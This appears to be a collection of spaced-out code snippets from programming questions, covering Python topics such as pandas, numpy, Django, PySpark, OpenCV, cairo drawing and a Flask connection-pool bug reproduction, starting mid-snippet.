testbuf ) passdef strWithStringIO ( ) : global MyStrIo print `` writing string to StrinIO `` for index in range ( 1000 ) : MyStrIo.write ( testbuf ) def strWithStr ( ) : global MyStr print `` Writing String to STR `` for index in range ( 500 ) : MyStr = MyStr + testbufdef strWithCstr ( ) : global MycStrIo print `` writing String to Cstring '' for index in range ( 1000 ) : MycStrIo.write ( testbuf ) with Timer ( ) as t : strWithFiles ( ) print ( ' # # Request took % .03f sec . ' % t.interval ) with Timer ( ) as t : strWithStringIO ( ) print ( ' # # # Request took % .03f sec . ' % t.interval ) with Timer ( ) as t : strWithCstr ( ) print ( ' # # # # Request took % .03f sec . ' % t.interval ) with Timer ( ) as t : read1 = ' x ' + MyFile.read ( -1 ) print ( 'file read # # Request took % .03f sec . ' % t.interval ) with Timer ( ) as t : read2 = ' x ' + MyStrIo.read ( -1 ) print ( 'stringIo read # # # Request took % .03f sec . ' % t.interval ) with Timer ( ) as t : read3 = ' x ' + MycStrIo.read ( -1 ) print ( 'CString read # # # # Request took % .03f sec . ' % t.interval ) MyFile.close ( )"
"def draw_brush ( widget , x , y , odata , width=2.5 , r=1 , g=0 , b=0 , alpha=1 ) : cr = cairo.Context ( widget.surface ) cr.set_source_rgba ( r , g , b , alpha ) cr.set_line_width ( width ) cr.set_line_cap ( 1 ) cr.set_line_join ( 0 ) for stroke in odata : for i , point in enumerate ( stroke ) : if len ( stroke ) == 1 : radius = 2 cr.arc ( point [ ' x ' ] , point [ ' y ' ] , radius , 0 , 2.0 * math.pi ) cr.fill ( ) cr.stroke ( ) elif i ! = 0 : cr.move_to ( stroke [ i - 1 ] [ ' x ' ] , stroke [ i - 1 ] [ ' y ' ] ) cr.line_to ( point [ ' x ' ] , point [ ' y ' ] ) cr.stroke ( ) cr.save ( ) def motion_notify_event_cb ( self , widget , event ) : point = { ' x ' : event.x , ' y ' : event.y , 'time ' : time.time ( ) } if self.odata : self.odata [ -1 ] .append ( point ) if widget.surface is None : return False if event.state & Gdk.EventMask.BUTTON_PRESS_MASK : if self.buttons [ 'current ' ] == 'freehand ' : draw_brush ( widget , event.x , event.y , self.odata ) if self.buttons [ 'current ' ] == 'highlight ' : draw_brush ( widget , event.x , event.y , self.odata , width=12.5 , r=220/255 , g=240/255 , b=90/255 , alpha=0.10 ) widget.queue_draw ( ) return True In [ 3 ] : [ item for item in dir ( cairo ) if item.startswith ( `` OPERATOR '' ) ] Out [ 3 ] : [ 'OPERATOR_ADD ' , 'OPERATOR_ATOP ' , 'OPERATOR_CLEAR ' , 'OPERATOR_DEST ' , 'OPERATOR_DEST_ATOP ' , 'OPERATOR_DEST_IN ' , 'OPERATOR_DEST_OUT ' , 'OPERATOR_DEST_OVER ' , 'OPERATOR_IN ' , 'OPERATOR_OUT ' , 'OPERATOR_OVER ' , 'OPERATOR_SATURATE ' , 'OPERATOR_SOURCE ' , 'OPERATOR_XOR ' ]"
"disp ( [ 'before : ' , str ( arr [ 21,32,11 ] ) ] ) arr ( : , : ,2:2 : end ) = [ ] ; disp ( [ 'after : ' , str ( arr [ 21,32,11 ] ) ] ) before : 99089 after : 65699 print 'before : ' + str ( arr [ 20,31,10 ] ) arr = arr [ : , : ,1 : :2 ] # same output as np.delete ( arr , np.arange ( 0 , arr.shape [ 2 ] ,2 ) ,2 ) print 'after : ' + str ( arr [ 20,31,10 ] ) before : 99089 after : 62360"
"import pandas as pdimport numpy as npdf = pd.DataFrame ( np.nan , columns= [ ' A ' , ' B ' , ' C ' ] , index= [ 0,1,2 ] )"
"# ! /usr/bin/env python # -*- coding : UTF-8 -*-class Color ( object ) : # It 's strict on what to accept , but I kinda like it that way . def __init__ ( self , r=0 , g=0 , b=0 ) : self.r = r self.g = g self.b = b # Maybe this would be a better __init__ ? # The first may be more clear but this could handle way more cases ... # I like the first more though . What do you think ? # # def __init__ ( self , obj ) : # self.r , self.g , self.b = list ( obj ) [ :3 ] # This methods allows to use lists longer than 3 items ( eg . rgba ) , where # 'Color ( *alist ) ' would bail @ classmethod def from_List ( cls , alist ) : r , g , b = alist [ :3 ] return cls ( r , g , b ) # So we could use dicts with more keys than rgb keys , where # 'Color ( **adict ) ' would bail @ classmethod def from_Dict ( cls , adict ) : return cls ( adict [ ' r ' ] , adict [ ' g ' ] , adict [ ' b ' ] ) # This should theoreticaly work with every object that 's iterable . # Maybe that 's more intuitive duck typing than to rely on an object # to have an as_List ( ) methode or similar . @ classmethod def from_Object ( cls , obj ) : return cls.from_List ( list ( obj ) ) def __str__ ( self ) : return `` < Color ( % s , % s , % s ) > '' % ( self.r , self.g , self.b ) def _set_rgb ( self , r , g , b ) : self.r = r self.g = g self.b = b def _get_rgb ( self ) : return ( self.r , self.g , self.b ) rgb = property ( _get_rgb , _set_rgb ) def as_List ( self ) : return [ self.r , self.g , self.b ] def __iter__ ( self ) : return ( c for c in ( self.r , self.g , self.b ) ) # We could add a single value ( to all colorvalues ) or a list of three # ( or more ) values ( from any object supporting the iterator protocoll ) # one for each colorvalue def __add__ ( self , obj ) : r , g , b = self.r , self.g , self.b try : ra , ga , ba = list ( obj ) [ :3 ] except TypeError : ra = ga = ba = obj r += ra g += ga b += ba return Color ( *Color.check_rgb ( r , g , b ) ) @ staticmethod def check_rgb ( *vals ) : ret = [ ] for c in vals : c = int ( c ) c = min ( c , 255 ) c = max ( c , 0 ) ret.append ( c ) return retclass ColorAlpha ( Color ) : def __init__ ( self , r=0 , g=0 , b=0 , alpha=255 ) : Color.__init__ ( self , r , g , b ) self.alpha = alpha def __str__ ( self ) : return `` < Color ( % s , % s , % s , % s ) > '' % ( self.r , self.g , self.b , self.alpha ) # ... if __name__ == '__main__ ' : l = ( 220 , 0 , 70 ) la = ( 57 , 58 , 61 , 255 ) d = { ' r ' : 220 , ' g ' : 0 , ' b':70 } da = { ' r ' : 57 , ' g ' : 58 , ' b':61 , ' a':255 } c = Color ( ) ; print c # < Color ( 0 , 0 , 0 ) > ca = ColorAlpha ( *la ) ; print ca # < Color ( 57 , 58 , 61 , 255 ) > print ' -- - ' c = Color ( 220 , 0 , 70 ) ; print c # < Color ( 220 , 0 , 70 ) > c = Color ( *l ) ; print c # < Color ( 220 , 0 , 70 ) > # c = Color ( *la ) ; print c # - > Fail c = Color ( **d ) ; print c # < Color ( 220 , 0 , 70 ) > # c = Color ( **da ) ; print c # - > Fail print ' -- - ' c = Color.from_Object ( c ) ; print c # < Color ( 220 , 0 , 70 ) > c = Color.from_Object ( ca ) ; print c # < Color ( 57 , 58 , 61 , 255 ) > c = Color.from_List ( l ) ; print c # < Color ( 220 , 0 , 70 ) > c = Color.from_List ( la ) ; print c # < Color ( 57 , 58 , 61 , 255 ) > c = Color.from_Dict ( d ) ; print c # < Color ( 220 , 0 , 70 ) > c = Color.from_Dict ( da ) ; print c # < Color ( 57 , 58 , 61 , 255 ) > print ' -- - ' print 'Check = ' , Color.check_rgb ( ' 1 ' , 0x29a , -23 , 40 ) # Check = [ 1 , 255 , 0 , 40 ] print ' % s + % s = % s ' % ( c , 10 , c + 10 ) # < Color ( 57 , 58 , 61 ) > + 10 = < Color ( 67 , 68 , 71 ) > print ' % s + % s = % s ' % ( c , ca , c + ca ) # < Color ( 57 , 58 , 61 ) > + < Color ( 57 , 58 , 61 , 255 ) > = < Color ( 114 , 116 , 122 ) >"
"a , b = `` This is a string '' .split ( `` `` , 1 ) a , b = `` Thisisastring '' .split ( `` `` , 1 ) ValueError : not enough values to unpack ( expected 2 , got 1 ) a , *b = mystr.split ( `` `` , 1 ) b = b [ 0 ] if b else `` ''"
"def compute ( firstArg , **kwargs ) : # A function that does things # Fancy computing stuff ... # Saving to disk ... return Trueif __name__ == '__main__ ' : args = [ { 'firstArg ' : `` some data '' , 'otherArg ' : `` some other data '' 'andAnotherArg ' : x*2 } for x in range ( 42 ) ] pool = Pool ( 4 ) pool.starmap ( compute , args ) pool.close ( ) pool.terminate ( ) TypeError : compute ( ) takes 1 positional argument but 3 were given"
"from pyspark.context import SparkContextfile = `` file : ///home/sree/code/scrap/sample.txt '' sc = SparkContext ( 'local ' , 'TestApp ' ) data = sc.textFile ( file ) splits = [ data.map ( lambda p : int ( p ) + i ) for i in range ( 4 ) ] print splits [ 0 ] .collect ( ) print splits [ 1 ] .collect ( ) print splits [ 2 ] .collect ( ) 123 [ 1,2,3 ] [ 2,3,4 ] [ 3,4,5 ] [ 4 , 5 , 6 ] [ 4 , 5 , 6 ] [ 4 , 5 , 6 ]"
"import torchimport torchtextfrom torchtext.datasets import text_classificationNGRAMS = 2import osif not os.path.isdir ( './.data ' ) : os.mkdir ( './.data ' ) train_dataset , test_dataset = text_classification.DATASETS [ 'AG_NEWS ' ] ( root='./.data ' , ngrams=NGRAMS , vocab=None ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -OverflowError Traceback ( most recent call last ) < ipython-input-1-7e8544fdaaf6 > in < module > 6 if not os.path.isdir ( './.data ' ) : 7 os.mkdir ( './.data ' ) -- -- > 8 train_dataset , test_dataset = text_classification.DATASETS [ 'AG_NEWS ' ] ( root='./.data ' , ngrams=NGRAMS , vocab=None ) 9 # BATCH_SIZE = 16 10 # device = torch.device ( `` cuda '' if torch.cuda.is_available ( ) else `` cpu '' ) c : \users\pramodp\appdata\local\programs\python\python36\lib\site-packages\torchtext\datasets\text_classification.py in AG_NEWS ( *args , **kwargs ) 168 `` '' '' 169 -- > 170 return _setup_datasets ( * ( ( `` AG_NEWS '' , ) + args ) , **kwargs ) 171 172 c : \users\pramodp\appdata\local\programs\python\python36\lib\site-packages\torchtext\datasets\text_classification.py in _setup_datasets ( dataset_name , root , ngrams , vocab , include_unk ) 126 if vocab is None : 127 logging.info ( 'Building Vocab based on { } '.format ( train_csv_path ) ) -- > 128 vocab = build_vocab_from_iterator ( _csv_iterator ( train_csv_path , ngrams ) ) 129 else : 130 if not isinstance ( vocab , Vocab ) : c : \users\pramodp\appdata\local\programs\python\python36\lib\site-packages\torchtext\vocab.py in build_vocab_from_iterator ( iterator ) 555 counter = Counter ( ) 556 with tqdm ( unit_scale=0 , unit='lines ' ) as t : -- > 557 for tokens in iterator : 558 counter.update ( tokens ) 559 t.update ( 1 ) c : \users\pramodp\appdata\local\programs\python\python36\lib\site-packages\torchtext\datasets\text_classification.py in _csv_iterator ( data_path , ngrams , yield_cls ) 33 with io.open ( data_path , encoding= '' utf8 '' ) as f : 34 reader = unicode_csv_reader ( f ) -- - > 35 for row in reader : 36 tokens = ' '.join ( row [ 1 : ] ) 37 tokens = tokenizer ( tokens ) c : \users\pramodp\appdata\local\programs\python\python36\lib\site-packages\torchtext\utils.py in unicode_csv_reader ( unicode_csv_data , **kwargs ) 128 maxInt = int ( maxInt / 10 ) 129 -- > 130 csv.field_size_limit ( sys.maxsize ) 131 132 if six.PY2 : OverflowError : Python int too large to convert to C long pos = data.TabularDataset ( path='data/pos/pos_wsj_train.tsv ' , format='tsv ' , fields= [ ( 'text ' , data.Field ( ) ) , ( 'labels ' , data.Field ( ) ) ] )"
"class DjangoRouter ( object ) : '' '' '' A router to control all database operations on models in theauth application . `` `` '' def db_for_read ( self , model , **hints ) : `` '' '' Attempts to read auth models go to auth. `` '' '' app_list = ( 'auth ' , 'admin ' , 'contenttypes ' , 'sessions ' , ) if model._meta.app_label in app_list : return 'default ' return Nonedef db_for_write ( self , model , **hints ) : `` '' '' Attempts to write auth models go to auth. `` '' '' app_list = ( 'auth ' , 'admin ' , 'contenttypes ' , 'sessions ' , ) if model._meta.app_label in app_list : return 'default ' return Nonedef allow_relation ( self , obj1 , obj2 , **hints ) : `` '' '' Allow relations if a model in the auth app is involved. `` '' '' app_list = ( 'auth ' , 'admin ' , 'contenttypes ' , 'sessions ' , ) if obj1._meta.app_label in app_list and obj2._meta.app_label in app_list : return True return Nonedef allow_migrate ( self , db , app_label , model=None , **hints ) : `` '' '' Make sure the auth app only appears in the 'auth ' database. `` '' '' app_list = ( 'auth ' , 'admin ' , 'contenttypes ' , 'sessions ' , ) if app_label in app_list : return db == 'default ' return None 'default ' : { 'ENGINE ' : 'sql_server.pyodbc ' , 'NAME ' : 'Django ' , 'USER ' : `` , 'PASSWORD ' : `` , 'HOST ' : 'sqlbeta ' , 'PORT ' : `` , } , DATABASES = { # 'default ' : { # 'ENGINE ' : 'django.db.backends.sqlite3 ' , # 'NAME ' : os.path.join ( BASE_DIR , 'db.sqlite3 ' ) , # } , 'default ' : { 'ENGINE ' : 'sql_server.pyodbc ' , 'NAME ' : 'Django ' , 'USER ' : `` , 'PASSWORD ' : `` , 'HOST ' : 'sqlbeta ' , 'PORT ' : `` , } , 'master ' : { 'ENGINE ' : 'sql_server.pyodbc ' , 'NAME ' : 'master ' , 'USER ' : `` , 'PASSWORD ' : `` , 'HOST ' : 'sqlbeta ' , 'PORT ' : `` , } , 'databaseone ' : { 'ENGINE ' : 'sql_server.pyodbc ' , 'NAME ' : 'databaseone ' , 'USER ' : `` , 'PASSWORD ' : `` , 'HOST ' : 'sqlbeta ' , 'PORT ' : `` , } , 'databasetwo ' : { 'ENGINE ' : 'sql_server.pyodbc ' , 'NAME ' : 'databasetwo ' , 'USER ' : `` , 'PASSWORD ' : `` , 'HOST ' : 'sqlbeta ' , 'PORT ' : `` , } , } class UserCreationForm ( forms.ModelForm ) : `` '' '' A form that creates a user , with no privileges , from the given username and password. `` '' '' error_messages = { 'password_mismatch ' : _ ( `` The two password fields did n't match . `` ) , } password1 = forms.CharField ( label=_ ( `` Password '' ) , widget=forms.PasswordInput ) password2 = forms.CharField ( label=_ ( `` Password confirmation '' ) , widget=forms.PasswordInput , help_text=_ ( `` Enter the same password as above , for verification . '' ) ) class Meta : model = User fields = ( `` username '' , ) def clean_password2 ( self ) : password1 = self.cleaned_data.get ( `` password1 '' ) password2 = self.cleaned_data.get ( `` password2 '' ) if password1 and password2 and password1 ! = password2 : raise forms.ValidationError ( self.error_messages [ 'password_mismatch ' ] , code='password_mismatch ' , ) return password2 def save ( self , commit=True ) : user = super ( UserCreationForm , self ) .save ( commit=False ) user.set_password ( self.cleaned_data [ `` password1 '' ] ) if commit : user.save ( ) return user class CustomUserCreationForm ( UserCreationForm ) : now = timezone.now ( ) class Meta : model = User fields = ( 'username ' , ) def save ( self , commit=True ) : user = super ( CustomUserCreationForm , self ) .save ( commit=False ) user.date_joined = self.now if commit : user.save ( ) return userclass CustomUserAdmin ( UserAdmin ) : add_form = CustomUserCreationFormadmin.site.unregister ( User ) admin.site.register ( User , CustomUserAdmin )"
"dict ( ( fn ( i+1 ) , code ) for i , code in enumerate ( 'FGHJKMNQUVXZ ' ) for fn in ( int , str ) ) > > { 1 : ' F ' , ' 1 ' : ' F ' , 2 : ' G ' , ' 2 ' : ' G ' , 3 : ' H ' , ' 3 ' : ' H ' , 4 : ' J ' , ... }"
"[ ' A ' , ' B ' , ' C ' ] - > A = 0 , B = 1 , C = 2 'ABC '' CAB '"
"ticker_symbol : : String , monthly_return : : Float , date : : Timestamp AAPL , 0.112 , 28/2/1992GS , 0.13 , 30/11/1981GS , -0.23 , 22/12/1981 < class 'pandas.core.frame.DataFrame ' > DatetimeIndex : 2268 entries , 1993-01-04 00:00:00+00:00 to 2001-12-31 00:00:00+00:00Data columns : AA 2268 non-null valuesAAPL 2268 non-null valuesGE 2268 non-null valuesIBM 2268 non-null valuesJNJ 2268 non-null valuesKO 2268 non-null valuesMSFT 2268 non-null valuesPEP 2268 non-null valuesSPX 2268 non-null valuesXOM 2268 non-null valuesdtypes : float64 ( 10 ) Date1993-01-04 00:00:00+00:00 73.001993-01-05 00:00:00+00:00 73.12 ... 2001-12-28 00:00:00+00:00 36.152001-12-31 00:00:00+00:00 35.55Name : AAPL , Length : 2268"
"print ( Y ) print ( Y.shape ) class_weights = compute_class_weight ( 'balanced ' , np.unique ( Y ) , Y ) print ( class_weights ) ValueError : classes should include all valid labels that can be in y 0 1 2 3 40 0 0 1 0 01 1 0 0 0 02 0 0 0 1 03 0 0 1 0 0 ... 14992 0 0 1 0 014993 0 0 1 0 0 model.fit ( X , Y , epochs=100 , shuffle=True , batch_size=1500 , class_weights=class_weights , validation_split=0.05 , verbose=1 , callbacks= [ csvLogger ] )"
"appt = json.dumps ( { `` title '' : `` meeting '' , `` start '' : `` 2016-11-20 '' } ) ; return render ( request , 'healthnet/profile_patient.html ' , { 'patient ' : patient , 'appt ' : appt_set } ) < script > var data = jQuery.parseJSON ( `` { { appt } } '' ) ; var events ; events = [ ] ; events.push ( data ) ; $ ( document ) .ready ( function ( ) { $ ( ' # calendar ' ) .fullCalendar ( { editable : true , eventLimit : true , // allow `` more '' link when too many events events : events } ) ; } ) ; < /script > var data = jQuery.parseJSON ( ' { `` title '' : `` meeting '' , `` start '' : `` 2016-11-20 '' } ' ) ;"
"> > > aarray ( [ -1000 , 1 , -1000 , 27 , -1000 , 125 , 216 , 343 , 512 , 729 ] ) > > > for i in a : ... print ( i** ( 1/3 . ) ) ... nan1.0nan3.0nan5.06.07.08.09.0 > > > -1000** ( 1/3 . ) -9.999999999999998 > > > ( -1000 ) ** ( 1/3 . ) ( 5+8.660254037844384j )"
Cashier # Store # Sales Refunds001 001 100 1002 001 150 2003 001 200 2004 002 400 1005 002 600 4 Cashier # Store # Sales Refunds Sales_StoreAvg Sales_All_Stores_Avg001 001 100 1 150 290002 001 150 2 150 290003 001 200 2 150 290004 002 400 1 500 290005 002 600 4 500 290 df.groupby ( [ 'Store # ' ] ) .sum ( ) .reset_index ( ) .groupby ( 'Sales ' ) .mean ( )
"> > > i=1 > > > add_one=lambda x : x+i > > > my_list= [ add_one ( i ) for i in [ 0,1,2 ] ] > > > my_list [ 0 , 2 , 4 ] > > > my_list [ 1 , 2 , 3 ]"
"import imutilsimport numpyimport cv2import sysdef part_area ( contours , round=10 ) : `` '' '' Finds the mode of the contour area . The idea is that most of the parts in an image will be separated and that finding the most common area in the list of areas should provide a reasonable value to approximate by . The areas are rounded to the nearest multiple of 200 to reduce the list of options . '' '' '' # Start with a list of all of the areas for the provided contours . areas = [ cv2.contourArea ( contour ) for contour in contours ] # Determine a threshold for the minimum amount of area as 1 % of the overall range . threshold = ( max ( areas ) - min ( areas ) ) / 100 # Trim the list of areas down to only those that exceed the threshold . thresholded = [ area for area in areas if area > threshold ] # Round the areas to the nearest value set by the round argument . rounded = [ int ( ( area + ( round / 2 ) ) / round ) * round for area in thresholded ] # Remove any areas that rounded down to zero . cleaned = [ area for area in rounded if area ! = 0 ] # Count the areas with the same values . counts = { } for area in cleaned : if area not in counts : counts [ area ] = 0 counts [ area ] += 1 # Reduce the areas down to only those that are in groups of three or more with the same area . above = [ ] for area , count in counts.iteritems ( ) : if count > 2 : for _ in range ( count ) : above.append ( area ) # Take the mean of the areas as the average part size . average = sum ( above ) / len ( above ) return averagedef find_hue_mode ( hsv ) : `` '' '' Given an HSV image as an input , compute the mode of the list of hue values to find the most common hue in the image . This is used to determine the center for the background color filter . '' '' '' pixels = { } for row in hsv : for pixel in row : hue = pixel [ 0 ] if hue not in pixels : pixels [ hue ] = 0 pixels [ hue ] += 1 counts = sorted ( pixels.keys ( ) , key=lambda key : pixels [ key ] , reverse=True ) return counts [ 0 ] if __name__ == `` __main__ '' : # load the image and resize it to a smaller factor so that the shapes can be approximated better image = cv2.imread ( sys.argv [ 1 ] ) # define range of blue color in HSV hsv = cv2.cvtColor ( image , cv2.COLOR_BGR2HSV ) center = find_hue_mode ( hsv ) print 'Center Hue : ' , center lower = numpy.array ( [ center - 10 , 50 , 50 ] ) upper = numpy.array ( [ center + 10 , 255 , 255 ] ) # Threshold the HSV image to get only blue colors mask = cv2.inRange ( hsv , lower , upper ) inverted = cv2.bitwise_not ( mask ) blurred = cv2.GaussianBlur ( inverted , ( 5 , 5 ) , 0 ) edged = cv2.Canny ( blurred , 50 , 100 ) dilated = cv2.dilate ( edged , None , iterations=1 ) eroded = cv2.erode ( dilated , None , iterations=1 ) # find contours in the thresholded image and initialize the shape detector contours = cv2.findContours ( eroded.copy ( ) , cv2.RETR_EXTERNAL , cv2.CHAIN_APPROX_SIMPLE ) contours = contours [ 0 ] if imutils.is_cv2 ( ) else contours [ 1 ] # Compute the area for a single part to use when setting the threshold and calculating the number of parts within # a contour area . part_area = part_area ( contours ) # The threshold for a part 's area - ca n't be too much smaller than the part itself . threshold = part_area * 0.5 part_count = 0 for contour in contours : if cv2.contourArea ( contour ) < threshold : continue # Sometimes parts are close enough together that they become one in the image . To battle this , the total area # of the contour is divided by the area of a part ( derived earlier ) . part_count += int ( ( cv2.contourArea ( contour ) / part_area ) + 0.1 ) # this 0.1 `` rounds up '' slightly and was determined empirically # Draw an approximate contour around each detected part to give the user an idea of what the tool has computed . epsilon = 0.1 * cv2.arcLength ( contour , True ) approx = cv2.approxPolyDP ( contour , epsilon , True ) cv2.drawContours ( image , [ approx ] , -1 , ( 0 , 255 , 0 ) , 2 ) # Print the part count and show off the processed image . print 'Part Count : ' , part_count cv2.imshow ( `` Image '' , image ) cv2.waitKey ( 0 )"
"def load_uri_in_browser ( self ) : self.cookiejar = LWPCookieJar ( config_dir + `` /cookies.txt '' ) if os.path.isfile ( self.cookiejar.filename ) : self.cookiejar.load ( ignore_discard=True ) # for testing , this does print cookies for index , cookie in enumerate ( self.cookiejar ) : print index , ' : ' , cookie self.opener = urllib2.build_opener ( urllib2.HTTPRedirectHandler ( ) , urllib2.HTTPHandler ( debuglevel=0 ) , urllib2.HTTPSHandler ( debuglevel=0 ) , urllib2.HTTPCookieProcessor ( self.cookiejar ) ) self.opener.addheaders = [ ( 'User-Agent ' , 'Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en-GB ; rv:1.9.2.13 ) Gecko/20101203 Firefox/3.6.13 ' ) ] self.view = webkit.WebView ( ) self.view.connect ( 'navigation-policy-decision-requested ' , self.navigation_policy_decision_requested_cb ) self.mainFrame = self.view.get_main_frame ( ) self.mainFrame.load_uri ( `` http : //twitter.com '' ) # gtk window loaded earlier self.window.add ( self.view ) self.window.show_all ( ) self.window.show ( ) def navigation_policy_decision_requested_cb ( self , view , frame , net_req , nav_act , pol_dec ) : uri=net_req.get_uri ( ) if uri.startswith ( 'about : ' ) : return False page = self.opener.open ( uri ) self.cookiejar.save ( ignore_discard=True ) view.load_string ( page.read ( ) , None , None , page.geturl ( ) ) pol_dec.ignore ( ) return True"
"sorted ( list ( map ( lambda x : `` '' .join ( x ) , list ( permutations ( 'AB ' , 4 ) ) ) ) ) sorted ( list ( map ( lambda x : `` '' .join ( x ) , list ( permutations ( 'AABB ' , 4 ) ) ) ) ) [ 'AABB ' , 'AABB ' , 'AABB ' , 'AABB ' , 'ABAB ' , 'ABAB ' , 'ABAB ' , ... [ 'AABB ' , 'ABAB ' , 'ABBA ' , 'BAAB ' , 'BABA ' , 'BBAA ' ] sorted ( list ( map ( lambda x : `` '' .join ( x ) , set ( permutations ( 'AABB ' , 4 ) ) ) ) )"
"variable_set ( 'mymodule_variablename ' , $ value ) ; variable_get ( 'mymodule_variablename ' , $ default_value ) ; variable_del ( 'mymodule_variablename ' ) ;"
"class AbstractModel ( models.Model ) : self.fields_prefix + '_title ' = models.CharField ( max_length=255 , blank=True , default= '' ) class Meta : abstract = Trueclass ModelOne ( AbstractModel ) : fields_prefix = 'someprefix1 ' id = models.AutoField ( primary_key=True ) class ModelTwo ( AbstractModel ) : fields_prefix = 'someprefix2 ' id = models.AutoField ( primary_key=True )"
"df = pd.DataFrame ( [ [ 1 , 5 , 2 , 8 , 2 ] , [ 2 , 4 , 4 , 20 , 2 ] , [ 3 , 3 , 1 , 20 , 2 ] , [ 4 , 2 , 2 , 1 , 3 ] , [ 5 , 1 , 4 , -5 , -4 ] , [ 1 , 5 , 2 , 2 , -20 ] , [ 2 , 4 , 4 , 3 , -8 ] , [ 3 , 3 , 1 , -1 , -1 ] , [ 4 , 2 , 2 , 0 , 12 ] , [ 5 , 1 , 4 , 20 , -2 ] ] , columns= [ ' A ' , ' B ' , ' C ' , 'D ' , ' E ' ] , index= [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] ) def streaks ( df , column ) : # Create sign column df [ 'sign ' ] = 0 df.loc [ df [ column ] > 0 , 'sign ' ] = 1 df.loc [ df [ column ] < 0 , 'sign ' ] = 0 # Downstreak df [ 'd_streak2 ' ] = ( df [ 'sign ' ] == 0 ) .cumsum ( ) df [ 'cumsum ' ] = np.nan df.loc [ df [ 'sign ' ] == 1 , 'cumsum ' ] = df [ 'd_streak2 ' ] df [ 'cumsum ' ] = df [ 'cumsum ' ] .fillna ( method='ffill ' ) df [ 'cumsum ' ] = df [ 'cumsum ' ] .fillna ( 0 ) df [ 'd_streak ' ] = df [ 'd_streak2 ' ] - df [ 'cumsum ' ] df.drop ( [ 'd_streak2 ' , 'cumsum ' ] , axis=1 , inplace=True ) # Upstreak df [ 'u_streak2 ' ] = ( df [ 'sign ' ] == 1 ) .cumsum ( ) df [ 'cumsum ' ] = np.nan df.loc [ df [ 'sign ' ] == 0 , 'cumsum ' ] = df [ 'u_streak2 ' ] df [ 'cumsum ' ] = df [ 'cumsum ' ] .fillna ( method='ffill ' ) df [ 'cumsum ' ] = df [ 'cumsum ' ] .fillna ( 0 ) df [ 'u_streak ' ] = df [ 'u_streak2 ' ] - df [ 'cumsum ' ] df.drop ( [ 'u_streak2 ' , 'cumsum ' ] , axis=1 , inplace=True ) del df [ 'sign ' ] return df streaks ( df , ' E ' ) A B C D E d_streak u_streak1 1 5 2 8 2 0.0 1.02 2 4 4 20 2 0.0 2.03 3 3 1 20 2 0.0 3.04 4 2 2 1 3 0.0 4.05 5 1 4 -5 -4 1.0 0.06 1 5 2 2 -20 2.0 0.07 2 4 4 3 -8 3.0 0.08 3 3 1 -1 -1 4.0 0.09 4 2 2 0 12 0.0 1.010 5 1 4 20 -2 1.0 0.0"
df1.index.difference ( df2 ) TypeError : ' < ' not supported between instances of 'float ' and 'str '
"$ sort -k1,1 -k2,2n -k3,3n infile > outfile Scf_3R 8599253 8621866 FBgn0000014 FBgn0191744 -0.097558026153Scf_3R 8497493 8503049 FBgn0000015 FBgn0025043 0.437973284047Scf_3L 16209309 16236428 FBgn0000017 FBgn0184183 -1.19105585707Scf_2L 10630469 10632308 FBgn0000018 FBgn0193617 0.073153454539Scf_3R 12087670 12124207 FBgn0000024 FBgn0022516 -0.023946795475Scf_X 14395665 14422243 FBgn0000028 FBgn0187465 0.00300558969397Scf_3R 25163062 25165316 FBgn0000032 FBgn0189058 0.530118698187Scf_3R 19757441 19808894 FBgn0000036 FBgn0189822 -0.282508464261"
"class treatment ( db.Model ) : __tablename__ = 'treatment ' __table_args__ = ( db.UniqueConstraint ( 'title ' , 'tenant_uuid ' ) , ) id = db.Column ( db.Integer , primary_key=True ) uuid = db.Column ( db.String ( ) , nullable=False , unique=True ) title = db.Column ( db.String ( ) , nullable=False ) tenant_uuid = db.Column ( db.String ( ) , nullable=False ) treatmentType_id = db.Column ( db.Integer , db.ForeignKey ( 'treatmentType.id ' ) ) riskResponse_id = db.Column ( db.Integer , db.ForeignKey ( 'riskResponse.id ' ) ) class treatmentType ( db.Model ) : __tablename__ = 'treatmentType ' __table_args__ = ( db.UniqueConstraint ( 'title ' , 'tenant_uuid ' ) , ) id = db.Column ( db.Integer , primary_key=True ) uuid = db.Column ( db.String ( ) , nullable=False , unique=True ) title = db.Column ( db.String ( ) , nullable=False ) tenant_uuid = db.Column ( db.String ( ) , nullable=False ) treatments = db.relationship ( 'treatment ' , backref='treatmentType ' , lazy='dynamic ' ) entry = treatmentType.query.filter_by ( tenant_uuid=session [ 'tenant_uuid ' ] ) .all ( ) try : db.session.delete ( entry ) db.session.commit ( ) return { 'success ' : 'Treatment Type deleted ' } except Exception as E : return { 'error ' : unicode ( E ) }"
@ pytest.fixture ( scope= '' module '' ) def data ( ) : return load_dataset1 ( )
"# ! /usr/bin/env python # -*- coding : utf-8 -*-import contextlibimport flaskimport psycopg2import psycopg2.poolapp = flask.Flask ( __name__ ) class ThreadConnectionPool ( psycopg2.pool.ThreadedConnectionPool ) : @ contextlib.contextmanager def item ( self ) : close = True connection = self.getconn ( ) connection.autocommit = True try : yield connection close = False finally : self.putconn ( connection , close=close or connection.closed ) pool = ThreadConnectionPool ( maxconn=1 , minconn=1 , **kwargs ) # kwargs are omitted here # sp_1 always returns 1 , sp_2 always returns 2EXPECTED = { 'sp_1 ' : 1 , 'sp_2 ' : 2 } @ app.route ( '/main/ ' , methods= [ 'GET ' ] ) def main_handler ( ) : procname = flask.request.args [ 'procname ' ] with pool.item ( ) as connection : cursor = connection.cursor ( ) cursor.callproc ( procname ) rows = cursor.fetchall ( ) if rows [ 0 ] [ 0 ] == EXPECTED [ procname ] : return 'OK\n ' else : # procedure returned something that it should n't return return 'ERROR\n'if __name__ == '__main__ ' : app.run ( ) [ uwsgi ] callable=appchdir=/path/to/my/project/module=mymodulemaster=Trueprocesses=4 ; if 1 , there is no problemsocket=127.0.0.1:9000threads=1 -- sp_1BEGIN Return 1 ; END ; -- sp_2BEGIN Return 2 ; END ; curl 'http : //mymodule.local/main/ ? procname=sp_1 ' & curl 'http : //mymodule.local/main/ ? procname=sp_2 ' [ 1 ] 10636ERRORERROR [ 1 ] + Done curl 'http : //mymodule.local/main/ ? procname=sp_1 '"
